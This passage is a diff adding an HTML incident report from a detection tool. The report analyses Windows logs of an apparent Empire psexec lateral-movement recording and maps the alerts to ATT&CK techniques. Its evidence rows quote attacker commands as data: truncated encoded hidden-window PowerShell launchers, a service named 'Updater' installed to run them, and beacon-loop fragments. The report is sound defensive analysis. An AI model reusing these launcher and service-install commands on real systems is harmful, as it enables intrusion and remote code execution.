@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Drishti Nexus incident report - session 7869c7ec6e010758</title>
+<style>
+:root { --fg:#1b1f24; --muted:#5b6470; --line:#d8dde3; --bg:#ffffff; --panel:#f5f7f9;
+  --crit:#9b1c1c; --high:#c2410c; --med:#a16207; --low:#3f6212; --ok:#166534; --bad:#b91c1c; }
+* { box-sizing:border-box; }
+body { margin:0; background:var(--bg); color:var(--fg); font:14px/1.45 -apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
+main { max-width:1100px; margin:0 auto; padding:24px 16px 48px; }
+h1 { font-size:24px; margin:0 0 4px; }
+h2 { font-size:18px; margin:32px 0 10px; padding-bottom:4px; border-bottom:2px solid var(--fg); }
+h3 { font-size:15px; margin:0; }
+.muted { color:var(--muted); }
+.mono, code { font-family:Consolas,"Liberation Mono",Menlo,monospace; font-size:12px; overflow-wrap:anywhere; }
+table { border-collapse:collapse; width:100%; margin:6px 0 12px; }
+th, td { text-align:left; vertical-align:top; padding:4px 8px; border-bottom:1px solid var(--line); }
+th { background:var(--panel); font-weight:600; }
+td.n { text-align:right; font-variant-numeric:tabular-nums; }
+.grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:8px; margin:8px 0 12px; }
+.stat { background:var(--panel); border:1px solid var(--line); border-radius:6px; padding:8px 10px; }
+.stat b { display:block; font-size:22px; }
+.sev { display:inline-block; padding:1px 7px; border-radius:10px; color:#fff; font-size:12px; font-weight:600; text-transform:uppercase; }
+.sev-critical { background:var(--crit); } .sev-high { background:var(--high); }
+.sev-medium { background:var(--med); } .sev-low { background:var(--low); }
+.tag { display:inline-block; border:1px solid var(--line); border-radius:4px; padding:0 5px; margin:0 4px 2px 0; font-size:12px; background:var(--panel); }
+.incident { border:1px solid var(--line); border-radius:8px; padding:12px 14px; margin:14px 0; break-inside:avoid-page; }
+.incident > header { display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:6px; }
+.timeline { list-style:none; margin:10px 0 0; padding:0 0 0 14px; border-left:2px solid var(--line); }
+.timeline > li { position:relative; margin:0 0 14px; }
+.timeline > li::before { content:""; position:absolute; left:-21px; top:5px; width:10px; height:10px; border-radius:50%; background:var(--fg); }
+.kv { margin:4px 0; }
+.kv span { margin-right:12px; }
+.ok { color:var(--ok); font-weight:600; } .bad { color:var(--bad); font-weight:700; }
+.ai { border:2px dashed var(--med); border-radius:8px; padding:10px 14px; background:#fffbeb; }
+.warn { color:var(--bad); }
+@media print {
+  body { font-size:11px; }
+  main { max-width:none; padding:0; }
+  h2 { break-after:avoid-page; }
+  .incident, tr { break-inside:avoid-page; }
+  .sev, th, .stat, .tag { -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+  @page { size:A4; margin:14mm 12mm; }
+}
+</style>
+</head>
+<body>
+<main>
+<header>
+<h1>Drishti Nexus - Incident Report</h1>
+<div class="muted">Session <code>7869c7ec6e010758</code> · generated 2026-11-01 12:23:50Z · tool 1.1.0-dev</div>
+<p class="muted">All findings below are produced by deterministic, explainable detection rules. Every alert cites the evidence lines it is based on (<code>&lt;file&gt;:&lt;line&gt;</code>).</p>
+</header>
+
+<h2>1. Summary</h2>
+<div class="grid">
+  <div class="stat"><b>3</b>incidents</div>
+  <div class="stat"><b>7</b>alerts</div>
+  <div class="stat"><b>4348</b>log entries</div>
+  <div class="stat"><b>4348</b>physical lines</div>
+  <div class="stat"><b>1</b>evidence files</div>
+  <div class="stat"><b>1580 ms</b>analysis time</div>
+</div>
+
+<table><thead><tr><th>Rule</th><th class="n">Alerts</th></tr></thead><tbody>
+<tr><td>Injection Pattern Detected</td><td class="n">2</td></tr>
+<tr><td>Sigma: Service Installed That Runs Encoded PowerShell</td><td class="n">1</td></tr>
+<tr><td>Suspicious Command Execution</td><td class="n">4</td></tr>
+</tbody></table>
+
+
+<h3>MITRE ATT&amp;CK techniques observed</h3>
+<table><thead><tr><th>Technique</th><th>Name</th><th>Tactic</th><th class="n">Alerts</th></tr></thead><tbody>
+<tr><td><code>T1059</code></td><td>Command and Scripting Interpreter</td><td>Execution</td><td class="n">4</td></tr>
+<tr><td><code>T1190</code></td><td>Exploit Public-Facing Application</td><td>Initial Access</td><td class="n">2</td></tr>
+<tr><td><code>T1569.002</code></td><td></td><td>Execution</td><td class="n">1</td></tr>
+</tbody></table>
+
+
+<h2>2. Parse quality</h2>
+<p class="muted">Clean: a format parser matched exactly. Partial: a parser matched but something was repaired or assumed. BestEffort: no parser matched; raw text kept.</p>
+<table><thead><tr><th>Quality</th><th class="n">Entries</th><th class="n">%</th></tr></thead><tbody>
+<tr><td>Clean</td><td class="n">4348</td><td class="n">100.0</td></tr>
+<tr><td>Partial</td><td class="n">0</td><td class="n">0.0</td></tr>
+<tr><td>BestEffort</td><td class="n">0</td><td class="n">0.0</td></tr>
+</tbody></table>
+<table><thead><tr><th>Parser</th><th class="n">Entries</th><th class="n">%</th></tr></thead><tbody>
+<tr><td>json</td><td class="n">4348</td><td class="n">100.0</td></tr>
+</tbody></table>
+
+
+<h2>3. Incidents</h2>
+
+<table><thead><tr><th>Incident</th><th>Severity</th><th>First seen</th><th>Last seen</th><th class="n">Alerts</th><th>ATT&amp;CK</th><th>Correlation</th></tr></thead><tbody>
+<tr><td><a href="#INC-00001">INC-00001</a></td><td><span class="sev sev-critical">critical</span></td><td>2020-09-20 16:16:10Z</td><td>2020-09-20 16:18:18Z</td><td class="n">2</td><td>T1059, T1190</td><td class="mono">host=WORKSTATION5.theshire.local</td></tr>
+<tr><td><a href="#INC-00002">INC-00002</a></td><td><span class="sev sev-high">high</span></td><td>2020-09-20 16:16:58Z</td><td>2020-09-20 16:17:20Z</td><td class="n">3</td><td>T1059, T1569.002</td><td class="mono">host=WORKSTATION6.theshire.local</td></tr>
+<tr><td><a href="#INC-00003">INC-00003</a></td><td><span class="sev sev-critical">critical</span></td><td>2020-09-20 16:17:01Z</td><td>2020-09-20 16:18:20Z</td><td class="n">2</td><td>T1059, T1190</td><td class="mono">host=WORKSTATION6</td></tr>
+</tbody></table>
+
+
+<section class="incident" id="INC-00001">
+<header><h3>INC-00001</h3><span class="sev sev-critical">critical</span>
+<span class="muted">2020-09-20 16:16:10Z → 2020-09-20 16:18:18Z</span>
+<span class="tag">T1059</span><span class="tag">T1190</span></header>
+<div class="muted mono">host=WORKSTATION5.theshire.local</div>
+<ol class="timeline">
+<li>
+  <div><b>2020-09-20 16:16:10Z</b> <span class="sev sev-high">high</span> <b>Suspicious Command Execution</b> <span class="muted">ALERT-000001 · 272 matches until 2020-09-20 16:18:18Z</span></div>
+  <div>Suspicious command execution (powershell) on WORKSTATION5.theshire.local</div>
+  <div class="kv"><span class="tag">ATT&amp;CK T1059 Command and Scripting Interpreter · Execution</span></div>
+  <div class="kv muted"><span>indicator=<code>powershell</code></span><span>message=<code>Pipeline execution details for command line: $taskURI = $script:TaskURIs | Get-Random . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1893 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBJAG … [&#43;5492 chars]</code></span><span>related_logs_truncated=<code>true</code></span><span>source=<code>WORKSTATION5.theshire.local</code></span></div>
+  
+  <table><thead><tr><th>Evidence line</th><th>Time</th><th>Source</th><th>Parsed message</th></tr></thead><tbody>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:24</td><td>2020-09-20 16:16:10Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: Start-Sleep -Seconds $sleepTime; . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1429 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBJAG8AbgBUAG … [&#43;5317 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:25</td><td>2020-09-20 16:16:10Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1431 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:27</td><td>2020-09-20 16:16:10Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: 0..255 | ForEach-Object { . Context Information: DetailSequence=1 DetailTotal=2 SequenceNumber=1433 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBJAG8AbgBUAGEAQgBsA … [&#43;20862 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:28</td><td>2020-09-20 16:16:10Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: 0..255 | ForEach-Object { . Context Information: DetailSequence=2 DetailTotal=2 SequenceNumber=1433 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBJAG8AbgBUAGEAQgBsA … [&#43;6520 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:30</td><td>2020-09-20 16:16:10Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $8f5b9 = New-Object System.Net.WebClient . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1435 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBJAG … [&#43;5350 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:32</td><td>2020-09-20 16:16:10Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $script:Headers.GetEnumerator() | % {$8f5b9.Headers.Add($_.Name, $_.Value)} . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1437 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1  … [&#43;5448 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:34</td><td>2020-09-20 16:16:11Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $taskURI = $script:TaskURIs | Get-Random . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1439 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBJAG … [&#43;5492 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:90</td><td>2020-09-20 16:16:15Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: Start-Sleep -Seconds $sleepTime; . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1441 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBJAG8AbgBUAG … [&#43;5317 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:91</td><td>2020-09-20 16:16:15Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1443 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:92</td><td>2020-09-20 16:16:15Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: 0..255 | ForEach-Object { . Context Information: DetailSequence=1 DetailTotal=2 SequenceNumber=1445 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBJAG8AbgBUAGEAQgBsA … [&#43;20862 chars]</td></tr>
+  <tr><td colspan="4" class="muted">+40 more cited lines, listed in the JSON report</td></tr>
+  </tbody></table>
+</li>
+<li>
+  <div><b>2020-09-20 16:16:10Z</b> <span class="sev sev-critical">critical</span> <b>Injection Pattern Detected</b> <span class="muted">ALERT-000002 · 29 matches until 2020-09-20 16:18:18Z</span></div>
+  <div>Command Injection pattern detected from WORKSTATION5.theshire.local</div>
+  <div class="kv"><span class="tag">ATT&amp;CK T1190 Exploit Public-Facing Application · Initial Access</span></div>
+  <div class="kv muted"><span>attack_type=<code>Command Injection</code></span><span>message=<code>Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1885 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</code></span><span>source=<code>WORKSTATION5.theshire.local</code></span></div>
+  
+  <table><thead><tr><th>Evidence line</th><th>Time</th><th>Source</th><th>Parsed message</th></tr></thead><tbody>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:25</td><td>2020-09-20 16:16:10Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1431 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:91</td><td>2020-09-20 16:16:15Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1443 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:127</td><td>2020-09-20 16:16:20Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1455 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:238</td><td>2020-09-20 16:16:25Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1467 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:293</td><td>2020-09-20 16:16:30Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1479 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:328</td><td>2020-09-20 16:16:35Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1491 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:550</td><td>2020-09-20 16:16:40Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1503 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:768</td><td>2020-09-20 16:16:45Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1515 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:834</td><td>2020-09-20 16:16:50Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1527 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:902</td><td>2020-09-20 16:16:55Z</td><td>WORKSTATION5.theshire.local</td><td class="mono">Pipeline execution details for command line: $IV=[BitConverter]::GetBytes($(Get-Random)); . Context Information: DetailSequence=1 DetailTotal=1 SequenceNumber=1539 UserId=THESHIRE\pgustavo HostName=ConsoleHost HostVersion=5.1.18362.752 HostId=1c1cb5c9-d305-49c1-9d7f-e864a6237819 HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcw … [&#43;5282 chars]</td></tr>
+  <tr><td colspan="4" class="muted">+19 more cited lines, listed in the JSON report</td></tr>
+  </tbody></table>
+</li>
+</ol>
+</section>
+
+<section class="incident" id="INC-00002">
+<header><h3>INC-00002</h3><span class="sev sev-high">high</span>
+<span class="muted">2020-09-20 16:16:58Z → 2020-09-20 16:17:20Z</span>
+<span class="tag">T1059</span><span class="tag">T1569.002</span></header>
+<div class="muted mono">host=WORKSTATION6.theshire.local</div>
+<ol class="timeline">
+<li>
+  <div><b>2020-09-20 16:16:58Z</b> <span class="sev sev-high">high</span> <b>Suspicious Command Execution</b> <span class="muted">ALERT-000003 · 134 matches until 2020-09-20 16:17:20Z</span></div>
+  <div>Suspicious command execution (powershell) on WORKSTATION6.theshire.local</div>
+  <div class="kv"><span class="tag">ATT&amp;CK T1059 Command and Scripting Interpreter · Execution</span></div>
+  <div class="kv muted"><span>indicator=<code>powershell</code></span><span>message=<code>A new process has been created. Creator Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Target Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Process Information: New Process ID: 0x270c New Process Name: C:\Windows\System32\whoami.exe Token Elevation Type: %%1936 Mandatory Label: S-1-16-16384 Creator Process ID: 0x1 … [&#43;1191 chars]</code></span><span>related_logs_truncated=<code>true</code></span><span>source=<code>WORKSTATION6.theshire.local</code></span></div>
+  
+  <table><thead><tr><th>Evidence line</th><th>Time</th><th>Source</th><th>Parsed message</th></tr></thead><tbody>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1213</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">A service was installed in the system. Subject: Security ID: S-1-5-21-4228717743-1032521047-1810997296-1104 Account Name: pgustavo Account Domain: THESHIRE Logon ID: 0x2990D17 Service Information: Service Name: Updater Service File Name: %COMSPEC% /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcw … [&#43;5088 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1240</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">A new process has been created. Creator Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Target Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Process Information: New Process ID: 0x10c8 New Process Name: C:\Windows\System32\conhost.exe Token Elevation Type: %%1936 Mandatory Label: S-1-16-16384 Creator Process ID: 0x … [&#43;1215 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1247</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">The handle to an object was closed. Subject : Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Handle ID: 0x3314 Process Information: Process ID: 0x10d8 Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1248</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">A handle to an object was requested. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Object Type: Key Object Name: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa Handle ID: 0xc4 Resource Attributes: - Process Information: Process ID: 0x10d8 Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe … [&#43;204 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1249</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">An attempt was made to access an object. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Object Type: Key Object Name: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa Handle ID: 0xc4 Resource Attributes: - Process Information: Process ID: 0x10d8 Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell … [&#43;75 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1250</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">The handle to an object was closed. Subject : Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Handle ID: 0xc4 Process Information: Process ID: 0x10d8 Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1251</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">A service was installed in the system. Service Name: Updater Service File Name: %COMSPEC% /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEA … [&#43;4954 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1255</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">The handle to an object was closed. Subject : Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Handle ID: 0x3314 Process Information: Process ID: 0x10d8 Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1256</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">A handle to an object was requested. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Object Type: Key Object Name: \REGISTRY\MACHINE\SOFTWARE\Microsoft\.NETFramework Handle ID: 0x148 Resource Attributes: - Process Information: Process ID: 0x10d8 Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.ex … [&#43;270 chars]</td></tr>
+  <tr><td class="mono">empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608.json:1257</td><td>2020-09-20 16:16:58Z</td><td>WORKSTATION6.theshire.local</td><td class="mono">The handle to an object was closed. Subject : Security ID: S-1-5-18 Account Name: WORKSTATION6$ Account Domain: THESHIRE Logon ID: 0x3E7 Object: Object Server: Security Handle ID: 0x148 Process Information: Process ID: 0x10d8 Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</td></tr>
+  <tr><td colspan="4" class="muted">+40 more cited lines, listed in the JSON report</td></tr>
+  </tbody></table>
+</li>
+<li>
